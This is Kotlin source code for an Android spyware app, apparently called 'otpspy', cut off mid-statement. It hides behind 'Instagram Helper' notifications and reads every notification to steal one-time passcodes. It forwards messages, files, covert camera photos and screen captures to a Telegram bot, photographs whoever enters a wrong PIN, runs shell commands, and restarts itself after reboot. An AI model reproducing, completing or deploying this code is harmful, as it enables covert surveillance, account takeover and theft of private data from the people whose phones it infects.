package com.example.otpspy

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.content.res.ColorStateList
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.Path
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.RingtoneManager
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Uri
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Button
import android.widget.CheckBox
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object Config {
    const val BOT_TOKEN = "PASTE_YOUR_TOKEN_HERE"
    const val CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE"
}

object Sender {

    private fun creds(ctx: Context): Pair<String, String>? {
        val p = ctx.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        val t = p.getString("token", "").orEmpty().trim().ifEmpty { Config.BOT_TOKEN }
        val c = p.getString("chat", "").orEmpty().trim().ifEmpty { Config.CHAT_ID }
        if (t.isEmpty() || c.isEmpty() || t.startsWith("PASTE")) return null
        return t to c
    }

    fun send(ctx: Context, text: String) {
        val pair = creds(ctx) ?: return
        Thread {
            try {
                val conn = URL("https://api.telegram.org/bot${pair.first}/sendMessage")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.connectTimeout = 15000
                conn.readTimeout = 15000
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                val body = JSONObject()
                    .put("chat_id", pair.second)
                    .put("text", text.take(3900))
                    .put("disable_web_page_preview", true)
                    .toString()
                conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) { }
        }.start()
    }

    fun sendFile(ctx: Context, path: String, caption: String = "", asPhoto: Boolean = false) {
        val pair = creds(ctx) ?: return
        val f = File(path)
        if (!f.exists() || !f.isFile) { send(ctx, "missing: $path"); return }
        if (f.length() > 45L * 1024 * 1024) { send(ctx, "too big: ${f.length() / 1048576} MB"); return }

        Thread {
            val b = "----" + System.nanoTime()
            val method = if (asPhoto) "sendPhoto" else "sendDocument"
            val field = if (asPhoto) "photo" else "document"
            try {
                val conn = URL("https://api.telegram.org/bot${pair.first}/$method")
                    .openConnection() as HttpURLConnection
                conn.doOutput = true
                conn.requestMethod = "POST"
                conn.connectTimeout = 20000
                conn.readTimeout = 180000
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
                val out = conn.outputStream
                out.write("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n${pair.second}\r\n".toByteArray())
                if (caption.isNotEmpty())
                    out.write("--$b\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n${caption.take(900)}\r\n".toByteArray())
                out.write("--$b\r\nContent-Disposition: form-data; name=\"$field\"; filename=\"${f.name}\"\r\nContent-Type: application/octet-stream\r\n\r\n".toByteArray())
                f.inputStream().use { it.copyTo(out) }
                out.write("\r\n--$b--\r\n".toByteArray())
                out.flush()
                out.close()
                conn.responseCode
                conn.disconnect()
            } catch (_: Exception) { }
        }.start()
    }

    fun sendBytes(ctx: Context, bytes: ByteArray, name: String, caption: String = "") {
        try {
            val f = File(ctx.cacheDir, name)
            f.writeBytes(bytes)
            sendFile(ctx, f.absolutePath, caption, true)
        } catch (_: Exception) { }
    }

    fun get(url: String, timeoutMs: Int): String? = try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = timeoutMs
        conn.readTimeout = timeoutMs
        val s = conn.inputStream.bufferedReader().use { it.readText() }
        conn.disconnect()
        s
    } catch (_: Exception) { null }

    fun token(ctx: Context) = creds(ctx)?.first
}

class NotifListener : android.service.notification.NotificationListenerService() {

    private val recent = ArrayDeque<String>()

    override fun onNotificationPosted(sbn: android.service.notification.StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return
            if (pkg == packageName) return
            val ex = sbn.notification?.extras ?: return
            val title = ex.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
            val text = ex.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val big = ex.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val body = if (big.isNotEmpty()) big else text
            if (title.isEmpty() && body.isEmpty()) return

            val prefs = getSharedPreferences("cfg", MODE_PRIVATE)
            val isOtp = Regex("\\b\\d{4,8}\\b").containsMatchIn("$title $body")

            try {
                val f = File(filesDir, "notif.log")
                f.appendText("${System.currentTimeMillis()}|$pkg|$title|$body\n")
                if (f.length() > 400_000) {
                    val keep = f.readLines().takeLast(800)
                    f.writeText(keep.joinToString("\n") + "\n")
                }
            } catch (_: Exception) { }

            if (!prefs.getBoolean("sendAll", false) && !isOtp) return

            val msg = buildString {
                append(if (isOtp) "\uD83D\uDD11 OTP" else "\uD83D\uDD14")
                append("\nApp: ").append(label(pkg))
                if (title.isNotEmpty()) append("\n").append(title)
                if (body.isNotEmpty()) append("\n").append(body)
            }
            val k = msg.hashCode().toString()
            if (recent.contains(k)) return
            recent.addLast(k)
            if (recent.size > 50) recent.removeFirst()
            Sender.send(applicationContext, msg)
        } catch (_: Exception) { }
    }

    private fun label(p: String) = try {
        val pm = packageManager
        pm.getApplicationLabel(pm.getApplicationInfo(p, 0)).toString()
    } catch (_: Exception) { p }

    companion object {
        fun enable(ctx: Context) = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
                android.service.notification.NotificationListenerService.requestRebind(
                    ComponentName(ctx, NotifListener::class.java))
        } catch (_: Exception) { }
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val a = intent.action ?: return
        if (a == Intent.ACTION_BOOT_COMPLETED || a == "android.intent.action.QUICKBOOT_POWERON") {
            NotifListener.enable(context)
            RatService.start(context)
            Watchdog.start(context)
            Sender.send(context, "\uD83D\uDD04 Rebooted\n${Build.MANUFACTURER} ${Build.MODEL}")
        } else if (a == Intent.ACTION_POWER_CONNECTED) {
            RatService.start(context)
        } else if (a == Intent.ACTION_MY_PACKAGE_REPLACED) {
            RatService.start(context)
            Watchdog.start(context)
        }
    }
}

class Watchdog : Service() {

    private val h = Handler(Looper.getMainLooper())
    private val tick = object : Runnable {
        override fun run() {
            RatService.start(this@Watchdog)
            h.postDelayed(this, 120_000)
        }
    }

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                NotificationChannel("wd", "Watchdog", NotificationManager.IMPORTANCE_MIN))
        try {
            val n = NotificationCompat.Builder(this, "wd")
                .setContentTitle("Instagram Helper")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build()
            if (Build.VERSION.SDK_INT >= 34)
                startForeground(1003, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            else startForeground(1003, n)
        } catch (_: Exception) { }
        h.post(tick)
    }

    override fun onDestroy() {
        h.removeCallbacks(tick)
        super.onDestroy()
    }

    companion object {
        fun start(c: Context) = try {
            val i = Intent(c, Watchdog::class.java)
            if (Build.VERSION.SDK_INT >= 26) ContextCompat.startForegroundService(c, i)
            else c.startService(i)
        } catch (_: Exception) { }
    }
}

class Admin : DeviceAdminReceiver() {

    override fun onPasswordFailed(context: Context, intent: Intent) {
        Sender.send(context, "\u26A0\uFE0F Wrong unlock attempt")
        try {
            Cam.snap(context, true) { b ->
                if (b != null) Sender.sendBytes(context, b, "fail.jpg", "Wrong PIN")
            }
        } catch (_: Exception) { }
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        Sender.send(context, "\u2705 Unlocked")
    }

    companion object {
        fun dpm(c: Context) = c.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        fun comp(c: Context) = ComponentName(c, Admin::class.java)
        fun active(c: Context) = try { dpm(c).isAdminActive(comp(c)) } catch (_: Exception) { false }
    }
}

object Shell {
    fun run(cmd: String): String = try {
        val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
        val out = p.inputStream.bufferedReader().readText()
        val err = p.errorStream.bufferedReader().readText()
        p.waitFor()
        (out + err).ifEmpty { "(no output)" }.take(3500)
    } catch (e: Exception) { "err: ${e.message}" }
}

object Cam {

    fun snap(ctx: Context, front: Boolean, cb: (ByteArray?) -> Unit) {
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) { cb(null); return }

        val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val ht = android.os.HandlerThread("cam")
        ht.start()
        val h = Handler(ht.looper)

        try {
            val want = if (front) CameraCharacteristics.LENS_FACING_FRONT
            else CameraCharacteristics.LENS_FACING_BACK

            var found: String? = null
            for (cid in mgr.cameraIdList) {
                if (mgr.getCameraCharacteristics(cid).get(CameraCharacteristics.LENS_FACING) == want) {
                    found = cid
                    break
                }
            }
            if (found == null) { cb(null); ht.quitSafely(); return }

            val camId: String = found
            val reader = ImageReader.newInstance(1280, 960, ImageFormat.JPEG, 2)
            var done = false

            reader.setOnImageAvailableListener({ r ->
                if (!done) {
                    done = true
                    var arr: ByteArray? = null
                    try {
                        val img = r.acquireLatestImage()
                        if (img != null) {
                            val buf = img.planes[0].buffer
                            val o = ByteArray(buf.remaining())
                            buf.get(o)
                            arr = o
                            img.close()
                        }
                    } catch (_: Exception) { }
                    cb(arr)
                    try { mgr.closeCamera(camId) } catch (_: Exception) { }
                    try { r.close() } catch (_: Exception) { }
                    ht.quitSafely()
                }
            }, h)

            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    try {
                        val req = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        req.addTarget(reader.surface)
                        d.createCaptureSession(listOf(reader.surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    try { s.capture(req.build(), null, h) }
                                    catch (_: Exception) { cb(null) }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) { cb(null) }
                            }, h)
                    } catch (_: Exception) { cb(null) }
                }

                override fun onDisconnected(d: CameraDevice) { }
                override fun onError(d: CameraDevice, e: Int) { cb(null) }
            }, h)

            h.postDelayed({
                if (!done) {
                    done = true
                    cb(null)
                    try { mgr.closeCamera(camId) } catch (_: Exception) { }
                }
            }, 6000)

        } catch (e: Exception) {
            cb(null)
            ht.quitSafely()
        }
    }
}

object Scr {
    @Volatile var instance: ScreenService? = null
    @Volatile var code: Int? = null
    @Volatile var data: Intent? = null
}

class ScreenCapActivity : Activity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(m.createScreenCaptureIntent(), 1)
    }

    override fun onActivityResult(req: Int, res: Int, data: Intent?) {
        if (res == RESULT_OK && data != null) {
            Scr.code = res
            Scr.data = data
            try {
                ContextCompat.startForegroundService(this, Intent(this, ScreenService::class.java))
            } catch (_: Exception) { }
            Toast.makeText(this, "Screen capture ON", Toast.LENGTH_SHORT).show()
        }
        finish()
    }
}

class ScreenService : Service() {

    private var proj: MediaProjection? = null
    private var vd: VirtualDisplay? = null
    private var reader: ImageReader? = null

    override fun onBind(i: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= 26)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(
                NotificationChannel("scr", "Screen", NotificationManager.IMPORTANCE_MIN))
        val n = NotificationCompat.Builder(this, "scr")
            .setContentTitle("Instagram Helper")
            .setContentText("Screen ready")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        try {
            if (Build.VERSION.SDK_INT >= 34)
                startForeground(1002, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
            else startForeground(1002, n)
        } catch (_: Exception) { }
    }

    override fun onStartCommand(i: Intent?, f: Int, id: Int): Int {
        if (proj == null) setup()
        return START_STICKY
    }

    @Suppress("DEPRECATION")
    private fun setup() {
        val c = Scr.code
        val d = Scr.data
        if (c == null || d == null) return
        val m = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            proj = m.getMediaProjection(c, d)
            proj?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { cleanup() }
            }, Handler(mainLooper))

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            val dm = DisplayMetrics()
            wm.defaultDisplay.getRealMetrics(dm)

            reader = ImageReader.newInstance(dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2)
            vd = proj?.createVirtualDisplay("scr", dm.widthPixels, dm.heightPixels, dm.densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader?.surface, null, null)
            Scr.instance = this
        } catch (_: Exception) { }
    }

    fun grab(): ByteArray? {
        val r = reader ?: return null
        val latch = CountDownLatch(1)
        var bmp: Bitmap? = null

        r.setOnImageAvailableListener({ rr ->
            try {
                val img = rr.acquireLatestImage()
                if (img != null) {
                    val plane = img.planes[0]
                    val b2 = Bitmap.createBitmap(img.width, img.height, Bitmap.Config.ARGB_8888)
                    b2.copyPixelsFromBuffer(plane.buffer)
                    bmp = b2
                    img.close()
                }
            } catch (_: Exception) { }
            latch.countDown()
        }, Handler(mainLooper))

        try {
            if (!latch.await(3, TimeUnit.SECONDS)) return null
        } catch (_: Exception) { return null }

        val b = bmp ?: return null
        val out = java.io.ByteArrayOutputStream()
        val w = 720
        val s = Bitmap.createScaledBitmap(b, w, (
